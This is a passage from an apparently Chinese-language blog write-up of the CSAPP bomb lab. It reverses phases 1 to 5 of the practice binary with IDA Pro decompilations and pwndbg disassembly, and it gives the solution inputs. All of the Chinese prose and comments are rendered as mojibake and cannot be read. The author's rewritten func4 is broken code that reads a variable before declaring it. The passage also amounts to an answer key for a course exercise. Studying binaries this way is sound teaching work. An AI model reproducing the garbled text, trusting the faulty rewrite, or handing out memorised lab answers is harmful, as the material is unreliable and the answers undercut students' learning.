ï¼Œå¯çŸ¥æ­£ç¡®ç­”æ¡ˆæ”¾åœ¨0x401338çš„ä½ç½®ï¼Œèµ‹ç»™esiåä½œä¸º<code>strings_not_equal</code>å‡½æ•°çš„å‚æ•°ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86<span class="number">-64</span> / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   <span class="number">0x400ee0</span> &lt;phase_1&gt;       sub    rsp, <span class="number">8</span></span><br><span class="line">   <span class="number">0x400ee4</span> &lt;phase_1+<span class="number">4</span>&gt;     mov    esi, <span class="number">0x402400</span></span><br><span class="line"> â–º <span class="number">0x400ee9</span> &lt;phase_1+<span class="number">9</span>&gt;     call   strings_not_equal                      &lt;strings_not_equal&gt;</span><br><span class="line">        rdi: <span class="number">0x603780</span> (input_strings) â—‚â€” <span class="number">0x363636616b6a</span> <span class="comment">/* &#x27;jka666&#x27; */</span></span><br><span class="line">        rsi: <span class="number">0x402400</span> â—‚â€” outsd dx, dword ptr [rsi] <span class="comment">/* &#x27;Border relations with Canada have never been better.&#x27; */</span></span><br><span class="line">        rdx: <span class="number">0x1</span></span><br><span class="line">        rcx: <span class="number">0x6</span></span><br></pre></td></tr></table></figure><p>IDA proåç¼–è¯‘ç»“æœï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_1</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="built_in">strings_not_equal</span>(a1, <span class="string">&quot;Border relations with Canada have never been better.&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;Border relations with Canada have never been better.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="phase-2">phase_2</h1><p>ä½¿ç”¨IDA pro å¯¹<code>phase_2()</code>å’Œ<code>read_six_numbers()</code>çš„<strong>åç¼–è¯‘</strong>ç»“æœï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_2</span><span class="params">(__int64 a1)</span>  <span class="comment">// a1 = RDI = RAX æ˜¯readlineçš„è¿”å›å­—ç¬¦ä¸²åœ°å€</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+0h] [rbp-38h] BYREF  // ç‰¹æ„å°†6å­—èŠ‚æ•°ç»„è¡¨ç¤ºä¸º3ä¸ªå˜é‡</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+4h] [rbp-34h] BYREF  // æ–¹ä¾¿å¾ªç¯ç‰¹æ®Šæƒ…å†µè¡¨ç¤º</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+18h] [rbp-20h] BYREF //</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">read_six_numbers</span>(a1, &amp;v3);  <span class="comment">// read_six_numberä¼šå°†è¯»å…¥ç»“æœæ”¾åˆ°rspå¾€å18h=24ä¸ªå­—èŠ‚</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 != <span class="number">1</span> )  <span class="comment">// é¦–å…ƒç´ éœ€ä¸º1</span></span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, &amp;v3);</span><br><span class="line">  v2 = &amp;v4;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">2</span> * *((_DWORD *)v2 - <span class="number">1</span>));  <span class="comment">// result = 2*arr[i-1]</span></span><br><span class="line">    <span class="keyword">if</span> ( *(_DWORD *)v2 != (_DWORD)result )</span><br><span class="line">      <span class="built_in">explode_bomb</span>(a1, &amp;v3);</span><br><span class="line">    v2 += <span class="number">4</span>;  <span class="comment">// è½¬æˆ_DWORD*åŠ 1, æˆ–char*åŠ 4</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v2 != &amp;v5 );</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">read_six_numbers</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = __isoc99_sscanf(a1, <span class="string">&quot;%d %d %d %d %d %d&quot;</span>, a2, a2 + <span class="number">4</span>, a2 + <span class="number">8</span>, a2 + <span class="number">12</span>, a2 + <span class="number">16</span>, a2 + <span class="number">20</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt;= <span class="number">5</span> )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;%d %d %d %d %d %d&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¨‹åºä¼šä½¿ç”¨sscanf() ä»raxåœ°å€çš„å­—ç¬¦ä¸²ä¸­è¯»å–6ä¸ªæ•´æ•°åˆ°rspå¾€åçš„26=18hä¸ªå­—èŠ‚å¤„ï¼Œè¯»å…¥ç¬¬ä¸€ä¸ªæ•°å­—éœ€è¦ä¸º1ï¼Œåé¢æ¯ä¸ªæ•°å­—éœ€è¦æ˜¯å‰ä¸€ä¸ªæ•°å­—çš„2å€ã€‚</p><aside>ğŸ’¡ ç¬”è®°ï¼šsscanf()å’Œscanf()éƒ½æ˜¯è¯»å–åˆ°å±€éƒ¨ç¼“å†²åŒºçš„ï¼Œè¿™æ ·å¤§å—çš„å±€éƒ¨å†…å­˜æ˜¯åœ¨æ ˆä¸Šï¼Œæ˜¯ä»ä½ä½å¾€é«˜ä½æ”¾çš„ï¼ˆä¸æ ˆå¢é•¿çš„æ–¹å‘ç›¸åï¼‰ã€‚</aside><h1 id="phase-3">phase_3</h1><p>åç¼–è¯‘ <code>phase_3()</code>ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_3</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+8h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+Ch] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;%d %d&quot;</span>, &amp;v4, &amp;v5) &lt;= <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;%d %d&quot;</span>, v1, v2);</span><br><span class="line">  <span class="keyword">switch</span> ( v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      result = <span class="number">207LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      result = <span class="number">311LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      result = <span class="number">707LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">      result = <span class="number">256LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">      result = <span class="number">389LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">      result = <span class="number">206LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">      result = <span class="number">682LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">      result = <span class="number">327LL</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;%d %d&quot;</span>, v1, v2);</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result != v5 )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, <span class="string">&quot;%d %d&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><aside>ğŸ’¡ ç¬”è®°ï¼šJA (above) å’Œ JB (below) é’ˆå¯¹æ— ç¬¦å·æ•°ï¼ŒJG (greater) å’Œ JL (lower) é’ˆå¯¹æœ‰ç¬¦å·æ•°cmp æ˜¯-=ï¼Œtestæ˜¯&switchè¯­å¥æ˜¯é€šè¿‡è·³è½¬è¡¨ç»“æœå®ç°çš„ï¼Œæ•ˆç‡é«˜</aside><h1 id="phase-4">phase_4</h1><p><code>phase_4()</code> å’Œ <code>func4()</code> çš„åç¼–è¯‘ç»“æœï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">phase_4</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+8h] [rbp-10h] BYREF  // IDAæ˜¯æ ¹æ®jbeåˆ¤æ–­ä¸ºæ— ç¬¦å·æ•°çš„</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)__isoc99_sscanf(a1, <span class="string">&quot;%d %d&quot;</span>, &amp;v2, &amp;v3) != <span class="number">2</span> || v2 &gt; <span class="number">0xE</span> )</span><br><span class="line">    <span class="built_in">explode_bomb</span>();</span><br><span class="line">  result = <span class="built_in">func4</span>(v2, <span class="number">0LL</span>, <span class="number">14LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( (_DWORD)result || v3 )</span><br><span class="line">    <span class="built_in">explode_bomb</span>();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">func4</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// ecx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v3 = ((<span class="type">int</span>)a3 - (<span class="type">int</span>)a2) / <span class="number">2</span> + a2;  <span class="comment">// v3 = (a2+a3)/2 = 7L</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; (<span class="type">int</span>)a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span> * (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">func4</span>(a1, a2, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 - <span class="number">1</span>));</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt; (<span class="type">int</span>)a1 )</span><br><span class="line">    result = <span class="number">2</span> * (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">func4</span>(a1, (<span class="type">unsigned</span> <span class="type">int</span>)(v3 + <span class="number">1</span>), a3) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§‚å¯Ÿ <code>phase_4()</code> ï¼Œè¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—v2ä¸èƒ½å¤§äº14ï¼Œç¬¬äºŒä¸ªæ•°å­—v3å¿…é¡»ä¸º0ï¼Œä¸”<code>func4()</code>å¿…é¡»è¿”å›0ã€‚</p><p>è§‚å¯Ÿ <code>func4()</code>ï¼Œå…¶å®å°±å¯ä»¥è·å¾—ä¸€ç»„è§£ï¼š<code>7 0</code> ï¼Œç»“æœè¿›è¡Œå†æ•´ç†ä¸€ä¸‹å¯ä»¥çœ‹å‡ºæ˜¯ä¸ªäºŒåˆ†ç®—æ³•ï¼ˆä½†å…·ä½“æ˜¯å¹²å•¥çš„çŒœä¸å‡ºï¼Œæ¬¢è¿å¤§ç¥åœ¨è¯„è®ºåŒºè§£ç­”ï¼‰ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func4</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (val == n) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> val = (j + i) / <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (val &lt;= n) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * <span class="built_in">func4</span>(n, val+<span class="number">1</span>, j) + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * <span class="built_in">func4</span>(n, i, val<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>phase_4å…±æœ‰4ç»„è§£ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">3</span> <span class="number">0</span></span><br><span class="line"><span class="number">7</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><aside>ğŸ’¡ ç¬”è®°: shl/shråˆ†åˆ«æ˜¯é€»è¾‘å·¦/å³ç§»ï¼Œsal/saræ˜¯ç®—æœ¯ç§»åŠ¨</aside><h1 id="phase-5">phase_5</h1><p>åç¼–è¯‘ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">phase_5</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 i; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">string_length</span>() != <span class="number">6</span> )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(a1, a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">6</span>; ++i )</span><br><span class="line">    v4[i] = array_3449[*(_BYTE *)(a1 + i) &amp; <span class="number">0xF</span>];</span><br><span class="line">  v4[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">strings_not_equal</span>(v4, <span class="string">&quot;flyers&quot;</span>) )</span><br><span class="line">    <span class="built_in">explode_bomb</span>(v4, <span class="string">&quot;flyers&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®é™…ä¸Šè¿˜è¦å‚è€ƒåæ±‡ç¼–ä»£ç å’Œè°ƒè¯•è¿è¡Œæ—¶ä¿¡æ¯æ‰èƒ½æŠŠè¿™é¢˜åšå¥½ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble phase_5</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function phase_5:</span><br><span class="line">   <span class="number">0x0000000000401062</span> &lt;+<span class="number">0</span>&gt;:     push   rbx</span><br><span class="line">   <span class="number">0x0000000000401063</span> &lt;+<span class="number">1</span>&gt;:     sub    rsp,<span class="number">0x20</span></span><br><span class="line">   <span class="number">0x0000000000401067</span> &lt;+<span class="number">5</span>&gt;:     mov    rbx,rdi  ; rbxæ”¾è¾“å…¥å­—ç¬¦ä¸²</span><br><span class="line">=&gt; <span class="number">0x000000000040106a</span> &lt;+<span class="number">8</span>&gt;:     mov    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x0000000000401073</span> &lt;+<span class="number">17</span>&gt;:    mov    QWORD PTR [rsp+<span class="number">0x18</span>],rax  ; é˜²æŠ¤ï¼Œè®¾ç½®ä¸€ä¸ªcanaryï¼Œå¯ä»¥ä¸ç®¡å®ƒ</span><br><span class="line">   <span class="number">0x0000000000401078</span> &lt;+<span class="number">22</span>&gt;:    <span class="keyword">xor</span>    eax,eax</span><br><span class="line">   <span class="number">0x000000000040107a</span> &lt;+<span class="number">24</span>&gt;:    call   <span class="number">0x40131b</span> &lt;string_length&gt;</span><br><span class="line">   <span class="number">0x000000000040107f</span> &lt;+<span class="number">29</span>&gt;:    cmp    eax,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x0000000000401082</span> &lt;+<span class="number">32</span>&gt;:    je     <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line">   <span class="number">0x0000000000401084</span> &lt;+<span class="number">34</span>&gt;:    call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x0000000000401089</span> &lt;+<span class="number">39</span>&gt;:    jmp    <span class="number">0x4010d2</span> &lt;phase_5+<span class="number">112</span>&gt;</span><br><span class="line">---------------------------- <span class="keyword">for</span> ï¼ˆå‚è€ƒIDAåç¼–è¯‘ä»£ç ï¼‰</span><br><span class="line">   <span class="number">0x000000000040108b</span> &lt;+<span class="number">41</span>&gt;:    movzx  ecx,BYTE PTR [rbx+rax*<span class="number">1</span>]  ; é€å­—ç¬¦è®¿é—®è¾“å…¥</span><br><span class="line">   <span class="number">0x000000000040108f</span> &lt;+<span class="number">45</span>&gt;:    mov    BYTE PTR [rsp],cl</span><br><span class="line">   <span class="number">0x0000000000401092</span> &lt;+<span class="number">48</span>&gt;:    mov    rdx,QWORD PTR [rsp]</span><br><span class="line">   <span class="number">0x0000000000401096</span> &lt;+<span class="number">52</span>&gt;:    <span class="keyword">and</span>    edx,<span class="number">0xf</span>  ; å–å­—ç¬¦ä½<span class="number">4</span>ä½</span><br><span class="line">   <span class="number">0x0000000000401099</span> &lt;+<span class="number">55</span>&gt;:    movzx  edx,BYTE PTR [rdx+<span class="number">0x4024b0</span>]  </span><br><span class="line">   <span class="number">0x00000000004010a0</span> &lt;+<span class="number">62</span>&gt;:    mov    BYTE PTR [rsp+rax*<span class="number">1</span>+<span class="number">0x10</span>],dl</span><br><span class="line">   <span class="number">0x00000000004010a4</span> &lt;+<span class="number">66</span>&gt;:    add    rax,<span class="number">0x1</span></span><br><span class="line">   <span class="number">0x00000000004010a8</span> &lt;+<span class="number">70</span>&gt;:    cmp    rax,<span class="number">0x6</span></span><br><span class="line">   <span class="number">0x00000000004010ac</span> &lt;+<span class="number">74</span>&gt;:    jne    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x00000000004010ae</span> &lt;+<span class="number">76</span>&gt;:    mov    BYTE PTR [rsp+<span class="number">0x16</span>],<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x00000000004010b3</span> &lt;+<span class="number">81</span>&gt;:    mov    esi,<span class="number">0x40245e</span>  ; <span class="string">&quot;flyers&quot;</span></span><br><span class="line">   <span class="number">0x00000000004010b8</span> &lt;+<span class="number">86</span>&gt;:    lea    rdi,[rsp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x00000000004010bd</span> &lt;+<span class="number">91</span>&gt;:    call   <span class="number">0x401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">   <span class="number">0x00000000004010c2</span> &lt;+<span class="number">96</span>&gt;:    test   eax,eax</span><br><span class="line">   <span class="number">0x00000000004010c4</span> &lt;+<span class="number">98</span>&gt;:    je     <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004010c6</span> &lt;+<span class="number">100</span>&gt;:   call   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line">   <span class="number">0x00000000004010cb</span> &lt;+<span class="number">105</span>&gt;:   nop    DWORD PTR [rax+rax*<span class="number">1</span>+<span class="number">0x0</span>]</span><br><span class="line">   <span class="number">0x00000000004010d0</span> &lt;+<span class="number">110</span>&gt;:   jmp    <span class="number">0x4010d9</span> &lt;phase_5+<span class="number">119</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x00000000004010d2</span> &lt;+<span class="number">112</span>&gt;:   mov    eax,<span class="number">0x0</span></span><br><span class="line">   <span class="number">0x00000000004010d7</span> &lt;+<span class="number">117</span>&gt;:   jmp    <span class="number">0x40108b</span> &lt;phase_5+<span class="number">41</span>&gt;</span><br><span class="line">----------------------------</span><br><span class="line">   <span class="number">0x00000000004010d9</span> &lt;+<span class="number">119</span>&gt;:   mov    rax,QWORD PTR [rsp+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x00000000004010de</span> &lt;+<span class="number">124</span>&gt;:   <span class="keyword">xor</span>    rax,QWORD PTR fs:<span class="number">0x28</span></span><br><span class="line">   <span class="number">0x00000000004010e7</span> &lt;+<span class="number">133</span>&gt;:   je     <span class="number">0x4010ee</span> &lt;phase_5+<span class="number">140</span>&gt;</span><br><span class="line">   <span class="number">0x00000000004010e9</span> &lt;+<span class="number">135</span>&gt;:   call   <span class="number">0x400b30</span> &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   <span class="number">0x00000000004010ee</span> &lt;+<span class="number">140</span>&gt;:   add    rsp,<span class="number">0x20</span></span><br><span class="line">   <span class="number">0x00000000004010f2</span> &lt;+<span class="number">144</span>&gt;:   pop    rbx</span><br><span class="line">   <span class="number">0x00000000004010f3</span> &lt;+<span class="number">145</span>&gt;:   ret</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/s <span class="number">0x4024b0</span></span><br><span class="line"><span class="number">0x4024b0</span> &lt;array<span class="number">.3449</span>&gt;:  <span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do 